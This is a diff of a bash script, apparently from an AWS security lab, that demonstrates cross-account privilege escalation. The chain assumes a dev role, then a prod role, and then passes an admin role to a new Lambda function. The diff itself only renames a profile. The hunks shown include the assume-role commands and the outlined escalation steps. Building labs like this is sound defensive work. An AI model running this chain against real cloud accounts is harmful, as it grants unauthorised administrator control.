@@ -2,7 +2,7 @@
 
 # Cross-Account PassRole to Lambda Admin Attack Demo
 # This script demonstrates multi-hop cross-account privilege escalation via PassRole to Lambda admin
-# Path: pl-pathfinder-starting-user-dev -> pl-lambda-prod-updater -> pl-lambda-updater -> pl-Lambda-admin
+# Path: pl-pathfinding-starting-user-dev -> pl-lambda-prod-updater -> pl-lambda-updater -> pl-Lambda-admin
 
 set -e
 
@@ -16,8 +16,8 @@ if ! command -v aws &> /dev/null; then
 fi
 
 # Check if we have the required profile
-if ! aws sts get-caller-identity --profile pl-pathfinder-starting-user-dev &> /dev/null; then
-    echo "❌ AWS profile 'pl-pathfinder-starting-user-dev' not found"
+if ! aws sts get-caller-identity --profile pl-pathfinding-starting-user-dev &> /dev/null; then
+    echo "❌ AWS profile 'pl-pathfinding-starting-user-dev' not found"
     echo "Please run: ./create_pathfinder_profiles.sh"
     exit 1
 fi
@@ -27,14 +27,14 @@ echo "✅ AWS CLI and profile configured"
 # Step 1: Assume the dev lambda-prod-updater role
 echo ""
 echo "📋 Step 1: Assuming dev lambda-prod-updater role..."
-DEV_ACCOUNT_ID=$(aws sts get-caller-identity --profile pl-pathfinder-starting-user-dev --query 'Account' --output text)
+DEV_ACCOUNT_ID=$(aws sts get-caller-identity --profile pl-pathfinding-starting-user-dev --query 'Account' --output text)
 DEV_ROLE_ARN="arn:aws:iam::${DEV_ACCOUNT_ID}:role/pl-lambda-prod-updater"
 
 echo "Assuming role: $DEV_ROLE_ARN"
 
 # Get temporary credentials for the dev role
 DEV_TEMP_CREDS=$(aws sts assume-role \
-    --profile pl-pathfinder-starting-user-dev \
+    --profile pl-pathfinding-starting-user-dev \
     --role-arn "$DEV_ROLE_ARN" \
     --role-session-name "lambda-prod-updater-session" \
     --output json)
@@ -210,7 +210,7 @@ if [ "$ATTACK_SUCCESS" = "true" ]; then
     echo "✅ ATTACK SUCCESSFUL!"
     echo "======================"
     echo "The attack successfully demonstrated multi-hop privilege escalation:"
-    echo "1. Dev user pl-pathfinder-starting-user-dev assumed dev role pl-lambda-prod-updater"
+    echo "1. Dev user pl-pathfinding-starting-user-dev assumed dev role pl-lambda-prod-updater"
     echo "2. Dev role pl-lambda-prod-updater assumed prod role pl-lambda-updater"
     echo "3. Used iam:PassRole permission to create Lambda with admin role"
     echo "4. Lambda function executed with full admin privileges"
@@ -226,7 +226,7 @@ else
     echo "❌ ATTACK FAILED!"
     echo "=================="
     echo "The attack partially succeeded but failed to achieve admin privileges:"
-    echo "1. ✅ Dev user pl-pathfinder-starting-user-dev assumed dev role pl-lambda-prod-updater"
+    echo "1. ✅ Dev user pl-pathfinding-starting-user-dev assumed dev role pl-lambda-prod-updater"
     echo "2. ✅ Dev role pl-lambda-prod-updater assumed prod role pl-lambda-updater"
     echo "3. ✅ Used iam:PassRole permission to create Lambda with admin role"
     echo "4. ❌ Lambda function execution failed or did not demonstrate admin privileges"
